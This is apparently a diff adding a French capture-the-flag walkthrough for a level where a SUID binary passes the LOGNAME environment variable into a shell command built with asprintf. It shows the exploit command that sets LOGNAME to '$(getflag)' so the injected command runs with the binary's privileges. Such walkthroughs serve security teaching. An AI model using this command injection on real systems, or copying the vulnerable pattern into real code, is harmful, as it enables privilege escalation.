@@ -1,0 +1,20 @@
+# Definition
+`getenv` permet de récupérer la valeur d’une variable d’environnement.  
+Ici, le binaire utilise `asprintf` pour construire une commande avec `LOGNAME`, ce qui rend le programme vulnérable à une injection.
+
+# Piste
+En listant les fichiers, on trouve un exécutable SUID :  
+
+$ ls -la  
+-rwsr-x---+ 1 flag07 level07 ... level07  
+
+En analysant le binaire (via Dogbolt), on observe :  
+
+
+asprintf(&cmd, "/bin/echo %s ", getenv("LOGNAME"));
+
+Cela signifie que la valeur de LOGNAME est directement exécutée par /bin/echo.
+
+
+$ export LOGNAME='$(getflag)'
+$ ./level07
